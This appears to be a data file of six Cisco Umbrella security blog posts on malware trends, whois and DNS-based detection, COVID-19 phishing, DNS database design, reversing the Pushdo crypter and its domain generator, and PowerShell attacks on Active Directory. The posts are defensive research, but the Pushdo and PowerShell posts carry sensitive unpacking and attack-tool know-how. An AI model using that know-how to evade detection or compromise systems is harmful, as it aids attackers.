{"website": "Cisco-Umbrella", "title": "Visualizing 2016's Top Threats", "author": ["Austin McBride"], "link": "https://umbrella.cisco.com/blog/visualizing-2016s-top-threats", "abstract": "2016 brought us more traffic then ever and with that, we identified and protected our customers from a barrage of new attacks, threats, and actors. Understanding these evolutions are paramount to a strong defense. In this post we will visualize and summarize some of the biggest threats highlighted in the Cisco Annual Cybersecurity Report (ACR). To create these visualizations, we selected a number of domains that we have tagged as the particular threat, then used the Investigate API to pivot across co-occurring domains , IP addresses, file hashes, registrant information and other attributes to build a graph of their relationships. Finally we used OpenGraphiti to visualize these graphs and uncover their structure. The end result are the intriguing  visualizations below. Red nodes are known-blocklisted domains, gray nodes are often benign domains, green nodes are popular known good domains, orange are IP addresses, and blue nodes are file hashes. The pulses indicate DNS traffic between nodes. Nodes with rings around them are the seed domains we initially pivoted on. In some cases we may have chosen to recolor certain nodes in order to provide a more clear visualization, or to emphasize a particular relationship. Locky Without a doubt, Locky was one of the noisiest threats of the past year. This commodity ransomware can be built and distributed by any ambitious tech-savvy criminal due to continued Ransomware as a Service (RaaS) offerings. Campaigns involving Locky often used Necurs to aggressively email its broad range of targets with attachments containing droppers or links to download sites. On one day in late 2016, one of our mailboxes saw Locky in one-third of all email it received. Throughout the year, attackers modified the file extension used after a file was encrypted, resulting in a number of mythology-inspired variants. Every week resulted in a new variant, until it reached meme level. The degradation of file extensions started on theme with Zepto, Odin, Thor, Aesir and Osiris but then plummeted quickly with extensions like ZZZZ and S**T. This visualization has an interesting structure that looks somewhat like a skeleton key if you squint at it the right way. We chose this key imagery to symbolize the use of public/private keys by ransomware like Locky. Once the system is infected, the malware communicates back to an attacker controlled server to retrieve the key it will use to encrypt the data it will ultimately hold for ransom. The cluster of red nodes at the tip of the key shows the tightly interconnected structure of the domains used to host malware and generate keys. Cerber On board with the memo about the mythology naming convention, Cerber entered the Ransomware-as-a-Service scene in early 2016 with a splash. It quickly gained adoption and began to be distributed using popular exploit kits after toting offline encryption capabilities, a refusal to infect certain Eastern European/Northern Central Asia countries, and a mature approach to infection and evasion. Later improvements targeting databases indicate its creator’s vision is to target bigger companies who can pay out more – after all, from the criminal’s perspective, many organizations are getting off easy with a $500USD ransom. Our visualization of Cerber is focused around one registrant – this registrant has 57 registered domains, of which, 46 are associated with Cerber. Visualizing these domains and their connections reveals the actor’s infrastructure and how it’s used to host Cerber and other malware. Nemucod Nemucod, a JavaScript downloader, played an important role throughout the year by achieving a foothold for further infection on the target’s system. Its size made it lightweight enough for use as an email attachment and regular obfuscation/encapsulation changes made it often successful in bypassing detection systems. Nemucod jumpstarted the infection by retrieving and executing the primary payload of the actor. This is most commonly ransomware such as Locky, but has also been used with adware and ad-clicking malware like Miuref, Kovter, and Diplugem . Dridex Dridex is no stranger to top threat lists since the banking trojan and botnet first popped up in 2012. Infections rose steadily until 2015 when an international law enforcement operation resulted in the arrest of a key figure in its administration. That didn’t stop Dridex though, it continued to infect and enroll users into its botnet throughout 2016. Dridex is most widely known for its ability to inject into various web browsers to steal user credentials and take screenshots of banking websites. Its campaigns were among the first to weaponize Office Document Macros in email attachments for early stage infection. GozNym/Kryptik GozNym, also known as Kryptik, has a checkered history. The malware was the result of the merger of an advanced banking trojan whose source code was leaked publicly and a downloader. Like Dridex, GozNym aimed to compromise infected users banking credentials. GozNym leveraged some of the most refined and tailored Macro-enabled Word Documents as the initial downloader. Once the malware was executed, it employed an impressive array of anti-detection and advanced runtime techniques, using return-oriented programming to execute functionality using already loaded modules. Themes The themes shared among these threats highlight the procedural trends actors continue to evolve year over year. We saw these trends play out before 2016, and we’ll undoubtedly see them continue through 2017. Sent As An Email Attachment Each of these threats are distributed via email as attachments. Locky and Cerber are distributed broadly while Kryptik and Dridex are often targeted. While exploit kits are also used to distribute these threats, email is still a very widely used distribution method. Downloaders Attachments mirror Nemucod in that they act as a downloaders to retrieve malware and infect their target. The downloaders are usually written in JavaScript and VBScript, and often enclosed within a Macro enabled Office document or Zip file. They contact a hardcoded address to download the malicious executable containing the payload. Reliance on External Systems All of these threats also utilize a communication channel back to another system other than the download location for various purposes. Ransomware needs to fetch its encryption keys while the banking trojans use a command and control channel for issuing remote commands. The banking trojan may also redirect web traffic to imposter banking websites for credential collection. Targeting Windows All of these threats target the Windows Operating System. While malware does exist for other operating systems and some malware, like Adwind RAT, is written to be cross platform, Windows still remains the primary target of most malware. This is likely due to its market share, specifically the dependance of business. 2017 and Beyond! With 2017 underway, we are looking forward to new threats, themes and, of course, visualizations! We would love to hear what you think and the latest threats that you are visualizing.", "date": "2017-02-08"},
{"website": "Cisco-Umbrella", "title": "Who's Using Whose Whois?", "author": ["Anthony Kasza"], "link": "https://umbrella.cisco.com/blog/whos-using-whose-whois", "abstract": "Whois data is often difficult to work with given its plethora of unstandardized free text formats, the fact that much of it is registrant provided (meaning it’s often untrustworthy), and due to privacy protection services which mask the real whois record. As whois data naturally has many inconsistencies and anomalies, directly mining bulk whois data proves challenging. Instead of mining whois data, the OpenDNS research team often uses whois record values as auxiliary features of suspect domain names. Whois data enriches our findings and helps weight the decisions made during a manual investigation, as well as an automatic classification. This post will outline a method, incorporating whois data, that the OpenDNS labs team is using to locate suspicious and malicious infrastructure on the Internet. Domain Registration Notification System Internally, we have built a basic proof of concept system which monitors whois records of newly created domain names for select TLDs. The system is configured with four basic inputs: field type – this is the name of a normalized field in a whois record (e.g. registrant email, creation data, registrant fax number) field value – this is the value of the field in a whois record recipient – the research team member requesting the notifications action – what is to be done upon a whois record containing the field value: notify – send an email to the recipient blocklist – automatically blocklist the domain matching the whois record criteria sinkhole -automatically sinkhole the domain matching the whois record criteria We’ve been using the system for a little over a month now and have had some interesting results. System Results: Whois Blocklisting The ability to automatically blocklist a domain based on a field in a domain’s whois record is very powerful. To do so requires a high level of confidence in the whois field’s value. For example, automatically blocklisting a domain based on the registrar listed in its whois record will very likely result in a high rate of false positives. Blocklisting on a value which is likely to be unique to the domain’s owner, such as an email address or physical address, still has the ability to introduce false positives, but is much less likely. Mining the blocklist our research team internally moderates and incorporating open reports from other security researchers, we have been able to identify, with strong confidence, compromised and dedicated email addresses. Using our notification system, we are able to blocklist a domain shortly after it is registered, and in some cases before it is used maliciously. Another technique the labs team has begun using to identify suspicious domains is to monitor domain registrant email addresses for domains we currently consider malicious. The intuition here is that if OpenDNS considers example.com malicious, then user accounts at example.com, e.g. user@example.com, should at least be considered suspicious. Domain names registered by user@example.com are then also suspect. System Results: Whois Anomalies The final classification technique outlined in this blog also relies on monitoring newly created domain whois information and is rather similar to brand monitoring. This technique identifies whois records which have similarities to the whois records used by extremely popular domain names. For this classification technique, we first created the idea of a brand. Brands are entities which own a number of popular domain names, typically used for different purposes. Brands in this classifier are modeled by gathering the whois information from OpenDNS’s top domain names (similar to the Alexa top domains) and intelligently merging the domains’ records. Many of the brands we monitor are commonly known large Internet companies. For example, OpenDNS owns opendns.com and internetbadguys.com . OpenDNS would be considered the brand in this case and the whois records for both domains would be combined. With our brands modeled, we began monitoring for their whois information with the previously described proof of concept notification system. Initially we found mostly legitimate domains registered by our brands including quite a few unicode domains (which surprised us), likely for the purpose of protecting each of the brands’ reputations. We also found a few suspicious domain names that seemed to be completely unrelated to the brands we modeled, but were not yet confident in blocklisting these domain names. In an effort to remove the legitimate domain registrations, we identified heuristics which allow us to differentiate between these two types of registrations: Brands registering domains will often use a registrant email address which is somehow related to the brand and not a privacy protected email address. Domains registered by brands often resolve to IP netblocks owned by the brand. Within a short time period, brands will often register the same domain name with different TLDs (e.g. example.com, example.org, and example.net) as well as typo variations of the domain (e.g. example.com, exanple.com, ecample.com). Domains registered by a brand typically match the majority of a brand’s whois record and not just a single field. Brands typically register domains through a preferred registrar, often one providing brand protection services such as MarkMonitor or Corporation Service Company (CSC). Applying these heuristics to the whois notifications matching our brands’ records has provided us with a system that identifies suspicious domains registered with whois information mimicking popular websites. According to policy set in place by ICANN, the act of providing inaccurate whois records is grounds for suspension or deletion of a domain. Getting registrars to take action on inaccurate whois records is a different story often being a case-by-case effort. On the research team we’ve seen brand mimicking techniques before within the domain name itself. Some of the domains identified by Jeremiah O’Conner’s NLPRank , which applied natural language processing to domain name strings and often caught domains related to phishing, have also been identified with this brand monitoring technique. We on the research team love when multiple classifiers developed by multiple individuals converge on the suspiciousness of domains. It gives us warm fuzzy feelings. Below is a screenshot of two of the domains identified as suspicious by both of our classifiers: The following is a screenshot showing query volumes for another domain the brand monitoring system was able to identify. Note the domain’s registration date was June 14, the day OpenDNS blocklisted the domain for our customer was June 15, the domain was first seen resolving on June 17, and an immediate spike in query volume (often indicating a malicious domain “going live”) occurred on June 20. Below is another domain identified by the brand monitoring system. In this case, note that the email address which registered siginin-users|.|com has also registered other highly suspect domain names. If we felt confident this email address was malicious, we could add it to the whois monitoring system and auto blocklist all domains with this email as the registrant contact email in its whois record. Also note that at the time of writing this, signin-users|.|com would respond with HTTP 302 redirects and the Location header set to “https://google.com”. This is a rather suspicious thing to do as requests to google.com often also result in 302 redirects to www.google.com. Future Work One expansion of the whois notification system these classifiers are built upon is approximate whois record matching. By including a similarity score with each requested monitor, our research team will be able to identify whois records that approximately match. I’ve been testing the Jaro-Winkler distance as a matching function and have found good results thus far. So What? Whois data can be a pain to work with given the lack of standardizations and the range of cruft registrars accept. However, when combined with passive DNS and behavioral patterns, whois data can be used to identify suspect and malicious domains within a short time after registration. This shortening of the detection period is key to a strong security strategy.", "date": "2015-07-20"},
{"website": "Cisco-Umbrella", "title": "Working at Home? How to Protect Against Phishing During a Pandemic with Cisco Umbrella and OpenDNS", "author": ["Negisa Taymourian"], "link": "https://umbrella.cisco.com/blog/working-at-home-how-to-protect-against-phishing-during-a-pandemic-with-cisco-umbrella-and-opendns", "abstract": "In the wake of this unprecedented global health crisis, cyber attackers have shown no mercy. Earlier this week it was reported that hospitals in the U.S. and Europe, which have been struggling for weeks with an influx of patients, are now dealing with yet another issue: a surge of phishing and ransomware attacks. Even amidst a pandemic, attackers are looking for ways to exploit our most critical institutions and take advantage of vulnerable people with malicious campaigns . If we look back to the beginning of March, there were relatively few domains that even mentioned the words “COVID” or “Corona.” This is how quickly things have changed over the past month: On Friday April 3, 2020, there were more than 117,000 domains that included these keywords. Of those, more than 75,000 domains were phishing or otherwise malicious in nature. That means at least 65% of all domains with “COVID” or “Corona” are malicious! Fortunately, the recent global events have demonstrated the resilience of the cybersecurity community to combat new threats. Security professionals have come together quickly to share knowledge and combat these bad actors. I’m proud to share that we have recently made a number of updates to the Cisco Umbrella and OpenDNS services to ensure that we are protecting our users against pandemic themed cyberattacks. What are you doing to stay safe online at home? As many of us are now working and spending a lot more time at home, it’s important to think about how you can stay safe online. The good news: Cisco can help. To protect your family and home network, OpenDNS makes the web a safer place with customizable parental controls and basic security protection. And I should mention that it’s free and simple to get started with at home ! For enterprises, Cisco Umbrella delivers flexible, fast and effective cloud security so you can secure your remote workers , even in a matter of minutes. Cisco Umbrella combines multiple security functions into a single cloud-delivered service — helping you deliver the right level of security anywhere your users work. How we protect against attacks Our global cloud infrastructure resolves over 200 billion DNS requests daily , far more than any other security vendor, giving our researchers a unique view of the internet to better identify threats faster. We also have a team of industry-renowned researchers that are constantly finding new ways to uncover fingerprints that attackers leave behind , so that we have visibility into the bad neighborhoods on the internet. If a webpage you are trying to reach is malicious, we will stop the connection at the earliest possible point and give you a block page instead. Easy peasy! How we block COVID-19 related phishing attacks Our phishing category leverages indicators derived from multiple sources , including Cisco Talos intelligence, lexical clustering of domains, a natural language processing model, and a spike rank model, which detects sudden spikes of traffic to particular domains. Now, this phishing category also includes a blocklist of vetted COVID-19 URLs, domains, and IP addresses. We update the phishing category continuously with the latest malicious indicators of compromise as provided via the COVID-19 Cyber Threat Coalition (CTC) . This incredible organization is a global volunteer community of 2,500+ security professionals who are focused on stopping these bad actors, by carefully vetting IOCs for the security industry and sharing intelligence in this time of crisis. All Cisco Umbrella enterprise users and OpenDNS consumer users, are now getting protection from COVID-19 themed cyberattacks. Click with caution: phishing tips to protect you Now, more than ever, it is important to stay vigilant online. We see very sophisticated spam in these pandemic themed attacks. Generally speaking, the guidelines for identifying a phish have evolved. Think before you click, and keep in mind these helpful tips: Don’t count on an obvious spelling mistake or grammatical error in order to identify that it’s a phishing email. Avoid strangers by checking names and email addresses. Keep in mind that the email could seemingly come from someone you know. Be wary of unusual requests, even from known senders. Be extra cautious before you click! Hovering over links will not always show you the final destination of a URL. It could issue several redirects, which could result in landing on a different website. Do not trust a website just because you see HTTPS. Threat actors can obtain certificates for creating HTTPS websites. Never give out personal or financial information from an email request. Get protection at home for free It only takes one wrong click for cybercriminals to get a foothold into your network. Take steps to ensure that you are safely connecting to the internet. Get started with the OpenDNS free home service or the Cisco Umbrella free trial today! You can easily get protection in minutes. Also, you can extend the initial Cisco Umbrella 14-day trial period to 90 days by contacting the Cisco sales team. This offer will be available from now until July 1, 2020. Check out this blog for more information on additional security offerings Cisco is providing for free during this time of need.", "date": "2020-04-07"},
{"website": "Cisco-Umbrella", "title": "Redesigning Our DNS Database for Low Latency", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/redesigning-dns-database-low-latency", "abstract": "2 years ago, when we started studying how DNS records could be used to discover malicious activity, we needed a way to quickly access current and historical data. 3rd party solutions were too slow and too limited to implement Kopis , the very first model we wanted to try. The logs collected by the resolvers were already copied to HDFS for long-term storage, so a simple way to quickly retrieve records based on a DNS name or associated data was to store additional copies in HBase. The system turned out to be still too slow to automatically label new domains, but it was good enough to compute an informative reputation score for a specific domain when a user requested it. Thus, the “Security Graph” was born. A closer look at how the log files are processed Unlike passive DNS systems, packets are not captured by a dedicated process, but directly written by the resolvers to local log files. This architecture was easy to build over the existing stack. The number of hops and the late parsing/verification/deduplication stage do not add too much latency: 92% of the records are visible in the ZeroMQ stream less than 30 seconds after related packets have been logged by a resolver. The purpose of the first staging area is to unload the log files from the resolvers as soon as possible, if only because their local storage space is quite limited. This first staging area is also used to export multiple copies of the log files for different purposes. The second staging area is actually our main research server, where raw DNS packets are decoded, parsed, verified and deduplicated. Can a minimal change to the system drastically reduce the latency? As an alternative to the logfile/rsync/logfile/rsync/logfile pipe, we implemented the ability for the resolvers to serve the logs over a simple ZeroMQ socket. Clients can directly connect to the resolvers and retrieve the data as a feed. This greatly simplifies the architecture, lifts the limitations of on-disk storage and cuts the latency down to a few milliseconds. This is a big win for our models using only the real-time feed. Not so much for manual investigations and for running graph algorithms. HBase is a great solution to many problems, but is not a silver bullet. On our constantly overloaded research platform, insertions have to happen in batch, and can only keep up with the data from a small subset of the our resolvers. The latency of read operations is also too high to interactively run graph algorithms. In addition, our original experiments with generic reputation systems (RIP score, J-Score, SecureRank , C-Rank, Dorothy , Co-occurrences ) were implemented as Map/Reduce jobs. These can only run on a small subset of old data, and take nearly 24 hours to complete. For this reason, they provide little value for discovering and blocking malicious domains before it’s too late. DNS names used by malware are often active only for a few hours or even just for a few minutes. Our typical workflow involves looking for specific patterns in the authoritative logs stream, monitoring suspicious IP addresses, and milking compromised sites and dedicated rotators. We then want to manually review our findings before blocking or sinkholing them. More often than not, a query to our database doesn’t return anything. The traffic is displayed as nonexistent, no IP addresses are shown, so no reputation indicators can be displayed either. At the same time, the DNS name we are investigating actually resolves to a set of IPs that was already associated with many other names with a similar purpose that we just blocked. This information will eventually be available—when we might not need it any more. As a workaround, our API can automatically resolve a name using a dedicated resolve if no records have been found in the database. But by the time we manually look up a name, it might not resolve any more, or we might get different or less records than what was actually observed by our public resolvers. Up-to-date data is available, but is still in-transit. Buying more hardware is a way to mitigate this issue. But rethinking the system according to how we are actually using it is also an option. In-memory storage HBase is fast for random I/O. Memory caching systems are faster. For web applications, Memcache is frequently used as a simple caching layer for SQL databases. Would it be worth using the same approach for our DNS database? An initial experiment was conducted using Elliptics Network, mirroring the schema we were already using with HBase. Is a pure key/value store the best fit? As it happens, we almost exclusively need to: – Retrieve a set of items given a key: list the records for a given name and a given type, list the names mapping to a given server IP, list the recent queries sent by a given client IP. – Perform simple operations on sets, such as the intersection of the set of blocklisted names with the names mapping to a given IP. – Maintain counters, such as the number of suspicious domains observed on an IP address. – Do graph traversals, without requiring excessive network I/O. – Perform pattern matching Based on these constraints, Redis appeared like a perfect candidate. In order to populate the Redis database, we wrote a daemon that listens to the ZeroMQ stream of authoritative logs, and translates it into Redis queries. Each record is indexed twice: once as DNAME|t|QTYPE and once as RR|t|QTYPE``. For example an IPv4 record of 127.0.53.53 observed for www.ovh. will be stored in Redis using two different keys: www.ovh.tA and 127.0.0.53tA`. The actual value for these records are Redis sets. This is a compact data structure, and no extra deduplication effort is thus necessary. No range queries are required in order to retrieve records and names given a key. Unions and intersections can be directly handled by Redis. This makes common operations such as “what are the list of distinct names mapping to this list of IPs that we are not blocking yet” a very simple and efficient operation. Keys are set to expire 24 hours after their most recent update. HBase is not going anywhere and remains where historical data is being stored. However, the API our tools rely on in order to access the DNS database now transparently sends queries both to Redis and to HBase, and merges the results. Clients get the best of both worlds: historical data with a timeline, as well as fresh data just logged by the resolvers. Live reputation scores Redis also offers a very interesting data structure that we previously blogged about : HyperLogLog. HyperLogLog is incredibly useful to estimate the cardinality of a set, with very low memory requirements. How about using it to compute reputation scores? Using the same code base, we wrote another daemon listening to the same input stream, and looking for names that were flagged as suspicious, as well as IPs present in the threat intelligence feeds retrieved by MLSec’s Combine tool. Matching (IP, name) pairs are sent to Redis, the key being the IP and the name being possibly added to the related HyperLogLog structure. This provides an IP reputation score that gets updated nearly in real time. This reputation score is based on recent evidences rather than historical, now possibly incorrect data. The key has an expiration of 1 day, but the individual elements of the sets obviously don’t. An IP address being used for malicious purposes will thus get its reputation automatically cleaned up after one day of quarantine. But an IP address being used over a long period of time for malicious activities won’t expire, and will have its reputation getting worse and worse, even if only one malicious name is being observed every day. In order to investigate live campaigns, this reputation system turns out to be a more useful estimator of the “badness” of an IP address than the bayesian average we previously computed using a daily batch process (“RIP score”). How about using the same system to compute prefix and ASN reputation scores? These additional reputation scores were initially implemented to provide additional features to our first classifier. However, they are virtually useless for interactive investigations. Displaying long tables with list of numbers is possibly the worst way to help humans make a decision. A single number to label a full /24 or ASN space is also way too coarse. It is a low importance feature that can help a classifier correctly label data with features very similar to examples it was trained with, but low importance features are hard to interpret. Using pipelining, retrieving the value associated to multiple keys in Redis is merely as fast as retrieving the value associated to a single key. Therefore, given a reference IP address, we can quickly retrieve the individual reputation of all the IP addresses of the same subnet. Given a DNS name, this makes it easy to show the reputation of not only the IP addresses it resolves to, but also the reputation of the neighborhood for all these addresses. A single graph summarizes what we know about a name from an IP-based point of view, using our own labels combined with 37 third-party threat intelligence feeds. Pattern matching Common exploit kits, as well as many phishing pages, are trivial to track if the DNS names they use follow an identifiable pattern. Most of what we are blocking today is achieved by grepping the log stream for known IP addresses and known name patterns. Discovering new names following a known pattern helps identifying IP addresses dedicated to malicious activities, which in turn, can be used to discover new names to block even if these do not follow the same pattern. When these names are used by an exploit kit, we sinkhole some of them in order to reconstruct the infection chain. It is not uncommon for a rotator to serve different exploit kits, or to remain operational after the pattern used by the exploit kit changes. We have been milking the same rotator for over a year to follow the evolution of the Nuclear Exploit Kit. After a pattern change has been detected, we need to scan our DNS database for matching records, validate the pattern, find all the names that we missed, and see if we can use them to constitute a new set of dedicated IP addresses, name servers and registrants to watch and block. Redis supports full scans of the key space, with optional pattern matching. While not the fastest operation, it can still scan 45 million keys on a busy server in about 3 minutes without blocking other operations. Looking for ‘ paypal ‘ returns no less than 1973 names observed during a 24 hours period, most of them smelling really phishy. Redis as a graph database Using Redis as a graph database is not uncommon: Pinterest are storing their entire follower graph in Redis and opensource projects such as Related also show that Redis can be an option for dynamic graphs. The data we have in Redis is a live view of what happened on the Internet over the past 24 hours, as seen from our 23 points of presence. Raw log files only allowed us to look at fractions of the graph retroactively. But the speed of Redis is a game changer: we can now mine and visualize a graph made of live data and hopefully use it identify treats as they are happening. Besides being blazing fast, Redis provides two powerful features for achieving this goal: the ability to return random keys (entry points to traverse the graph) and server-side Lua scripting. Big data, small memory footprint As the time of writing, the graph representing 24 hours of activity, as well as the IP reputation from 37 threat intelligence feeds in addition to our own system, is made of approximatively 46 million vertices and 174 million edges. Using Redis, this entire graph requires only 21 Gb memory. Compressed dumps do not exceed 4 Gb. And the current version doesn’t even try to be memory efficient: keys and values are stored as plain ASCII strings. IP addresses would obviously benefit from binary encoding and a simple Huffman coding of DNS names can also significantly reduce the memory footprint. Caveats With the addition of a single virtual machine to our research infrastructure, we significantly improved its performance and its robustness – the Hadoop cluster being temporarily inaccessible is not critical any more. – However, Redis has a few peculiarities and limitations to be aware of. Redis provides two ways to persist data to disk. With different tradeoffs, but a common requirement: memory pages have to be cloned if they have to be modified while a background save operation is in progress. In our case, virtually all the pages get modified before the dump operation completes, meaning that nearly 42 Gb memory are required to save the database without requiring swapping. As an alternative, we tried Ardb . Unfortunately, the RANDOMKEY operation not being supported was a showstopper. Keys expire, individual set elements don’t. For this reason, IPs observed more than 24 hours ago can remain in a set as long as new IP addresses for the same name are observed. The practical implications are negligible and this can be worked around by tagging each element with a coarse timestamp. Similar to the servers producing the realtime feeds, the servers populating the data into Redis have been written in Rust . Initially, the Redis client library was quite limited, both in term of usability and features. But massive improvements were recently made which resulted in an additional performance boost for our applications. Exciting times Our DNS database is unique. By the quality of the data, but also by its features. The realtime feed already allowed watching for specific events and reacting right after a query was received by the OpenDNS resolvers. We now provide the same timeliness and freshness guarantees to ad-hoc queries. Keeping the entire graph in memory also opens new perspectives. Reputation systems and classifiers leveraging this can drastically help fighting modern malware, characterized by its agility.", "date": "2014-10-01"},
{"website": "Cisco-Umbrella", "title": "Cracking Pushdo and How to Bust Through Most Crypters", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/pushdo-crypter", "abstract": "Pushdo has historically (since 2008) had close ties to the Cutwail botnet, often acting as a dropper for it. The reader, however, is reminded: as malware executes on a system it can do almost anything it’s controller wants . Code execution is code execution, regardless if the malware has previously been used for sending spam, creating traffic for DoS attacks, or exfiltrating stolen business secrets to a drop server used by an advanced persistent threat actor during a nation-state sponsored cyber-espionage campaign. Previous versions of Pushdo have used DNS smokescreens, URL path randomization, and DGA fall back techniques for obscuring command and control (C2) communication. Recently, a new variant of the Pushdo implant surfaced which uses a new algorithm to generate domains. In an attempt to sever Pushdo communications for our customers, we reverse engineered the Pushdo sample, isolated functionality which generated domains, and reimplemented the algorithms logic. Unpacking the Sample Generally, malware authors tend to not ship their binaries in “plain text”. Once they have written and compiled their creations into an executable, they run it through a tool called a “crypter”. These tools typically cut up the input file into pieces, encrypt them, and place them into another executable which has been specially crafted to reassemble the payload and have it run. These outer shells are updated multiple times per day to evade detection by security software, and many even employ server-side polymorphism on the malware repository, which means each individual victim will receive a distinct copy of the malicious file. It’s not hard to see why naive signature based detection techniques cannot keep up with this style of distribution. In order to recover the inner payload, there are a few things to look for during analysis. In a somewhat half-hearted attempt to guard the inner workings of the crypter, the code which actually reassembles the payload itself needs to be found and decrypted. The first duty of an analyst is to locate this initial production of code. For the Pushdo sample we analyzed, the outer shell was compiled against Microsoft’s MFC. This is both a blessing and a curse. The downside is that MFC applications tend to be a complete mess of events and callbacks, and control flow is not always easy to statically determine. However, the advantage is that the tables of object methods are trivial to find, and so in practice it never takes very long to find suspicious functionality: In this custom window class, we found the function that decrypts the second stage of the crypter. With a little trial and error in a debugger in an isolated environment, the transfer of control can be found with relative ease: There’s a jump into the middle of some dynamically allocated memory, the first instructions of which are the typical “call/pop” combination so that this code can orient itself and locate all of the information it will need to reassemble the payload. However, debuggers are pretty poor environments for analyzing code, so we dumped out this memory region and imported it back into an IDA database: We even get to see some of what this stage will be up to — a dab of dynamic import fetching, a hint of memory protection fiddling, and a standard trick of setting up the payload to run using the Windows API UnmapViewOfFile. The thing to remember about this second stage of the crypter is that many of them tend to have a fatal flaw: they will reconstruct the original payload in memory as it was on disk before the crypter ran . Therefore, we don’t need to worry about the details of the bit-smashing done during reassembly. We just need to keep our eye out for PE parsing code… like this: Sure enough, setting a breakpoint here and investigating the area pointed to by edx, we find the original malware executable. One “.writemem” later in WinDbg and we’ve totally dispatched the crypter. Reverse Engineering the Communication Mechanisms Similar to previous variants of Pushdo, this sample uses a smokescreen technique in attempts to hide its actual command and control (C2) communications. One rather notable difference between this and previous versions of Pushdo is that this version has moved away from the recognizable URL patterns, such as “/?ptrxcz_”. In addition, gone are the POSTs to vmw.com and youtube.com. Interestingly though, according to domain features from Investigate , the average popularity score for a smokescreen domain in the previous version of Pushdo was 42.45 while the average popularity of a smokescreen domain used by this variant is 39.19; only a slight decrease in average smokescreen domain popularity. OpenDNS has noticed a large increase in queries for all smokescreen domains used by this variant of Pushdo starting around July 4. One such increase is depicted below. The domain resolutions from Pushdo implants could be the cause of this increase. The hardcoded list of 100 domains, pictured below, are resolved and contacted using HTTP POST methods. Most of these domains have no ties to the Pushdo malware and are completely legitimate. The actual C2 and benign domains are sent HTTP requests with identical features (data content, static HTTP headers and user-agent, etc). This muddies traffic analysis, potentially causing confusion for some analysts and automated analysis systems. After resolving and contacting the hard coded domains, the sample falls back to algorithmically generated domains with a hardcoded TLD of ‘.kz’. Similar to Cryptolocker, the Pushdo DGA is seeded on time. The algorithm which generates the domains is a shared secret between the threat actor controlling the botnet and the samples being distributed to compromise victim machines. This shared secret provides a layer of protection for the botnet by making its C2 domains a moving target for blocklists and take downs. Once a high level understanding of Pushdo’s call backs were established, deeper analyses were undertaken to fully comprehend how the implant programmatically generated call back domains. Loading up the payload Pushdo drops into IDA presents an embarrassment of riches. A cursory glance at the strings shows numerous avenues of initial investigation: We see all the hallmarks of malicious software: setting runkeys so that the malware will start executing again when the victim’s computer reboots, “svchost.exe” to do some good old-fashioned thread injection, an “http://%s” to reach out to a generated domain name, and even the alphabet used to do Base64 encoding. Since we were focused on finding the DGA, we followed the network related strings first, which led straight to the heart of the matter: This piece of code was responsible for finding a command and control server, with some backup plans in case of failure. It would first generate the domains for the given day and try to contact them in order. If all of these domains could not be reached, it would try the domains from the previous day. The process continued until either a server responded or until all domains from the previous 30 days had been tried. In the case of continued failure, it would try contacting domains for 15 days in the future as well, finally giving up if none could be reached. All that was left to do was to translate this piece of assembly code into something a little more user friendly, and then hook up this domain generation script into our main malicious domain feed. One crontab entry later, and our customers had complete protection. Working Smarter, Not Just Harder These days, security vendors collect tens if not hundreds of thousands of malware samples daily. It might seem that in the face of such volume, it would not be possible to complete such a detailed analysis on every file. This is correct — it is not possible, but that is not the whole story. Of the malware samples received daily, they are not all *essentially different* from one another. Many, if not most, of the differences are just the daily variations in the crypters used to hide the main payloads. The core malicious functionally changes at a far slower pace, with the exact same malicious binary being distributed for weeks or months at a time. This is where security companies can apply the most pressure. By doing deep analysis like reverse engineering the DGA, we force the malware authors to change a core piece of functionality, or risk losing control of their existing infrastructure. This, in turn, is slower and more error prone than just running their binary through yet another crypter to evade detection for a day, and often doesn’t happen. For example, the differences in the DGA for this version of Pushdo and the first version of the DGA which appeared in 2013 are mostly cosmetic. A few constants in the algorithm changed along with the table of letters used to generate the domain name fragments, but the structure of the algorithm was virtually identical. The image below shows the proactive blocking of a Pushdo C&C domain prior to it ever having been queried by an OpenDNS user. In closing, we’d like to thank Alexandru Maximciuc of BitDefender for bringing the new variant to our attention in addition to providing us with the sample to reverse.", "date": "2014-07-31"},
{"website": "Cisco-Umbrella", "title": "PowerShell Proves to Be an Easy Route Around AD Security", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/powershell-proves-to-be-an-easy-route-around-ad-security", "abstract": "It’s estimated as many as 95 percent of companies use Active Directory (AD) for user management and authentication. It’s also been proved a number of times that there are flaws in AD that allow attackers to do things like change passwords and escalate their privilege to administrator level. But one of the easiest entry points to an AD server, according to DAn Solutions CTO Sean Metcalf, is built into Windows. PowerShell is a core component of Windows, but as Metcalf demonstrated at Blackhat , utilizing just a few PowerShell tricks allows the use of password hash stealing tools like Mimikatz and the ability to do other things like forge Kerberos tickets. A valid Kerberos ticket, as explained in this post by Lynn Root, provides users with ongoing access to a requested service. Sean Metcalf demonstrates insecure Kerberos settings during his Blackhat 2015 session. With a “ golden ticket ,” it’s fairly easy to give yourself admin credentials for any user–even ones that don’t exist–on any domain running Active Directory. But where things get interesting, Metcalf explained to a crowd at Blackhat USA 2015 , is when known attacks like pass-the-hash and Mimikatz hash discovery are done in PowerShell. “PowerShell is in every version of Windows, and there are a bunch of toolkits for attackers,” Metcalf said. “With Powersploit and other attack tools, attackers can run attacks that don’t get caught by AV or malware detection.” Security Engineer Joe Bialek demonstrated how this is done during a live hacking session at Defcon 21 in 2013, noting that PowerShell is such a powerful tool (no pun intended) because it can run malicious scripts without ever touching a disk, which means it would not trigger any allowlisting products or any antivirus or malware detection tools. Metcalf outlined a number of ways to detect uses of PowerShell and typical persistence behaviors that hackers use in AD. Most importantly, he said, it’s a good idea to use an app logging tool–like SCCM–to log any and all PowerShell activity in AD, as well as set default policies to their strictest setting to only allow authorized administrators the access they need. Metcalf also mentioned that AD admins should consider using Microsoft’s Advanced Threat Analytics ( ATA ), which will ship this month, as it can detect some of the typical behaviors used to compromise and persist control of AD servers and domain controllers. Though Metcalf’s talk focused on Powershell and AD persistence methods, it’s a good reminder for security engineers and researchers that even approved, useful tools and software can be subverted for malicious uses.", "date": "2015-08-07"},
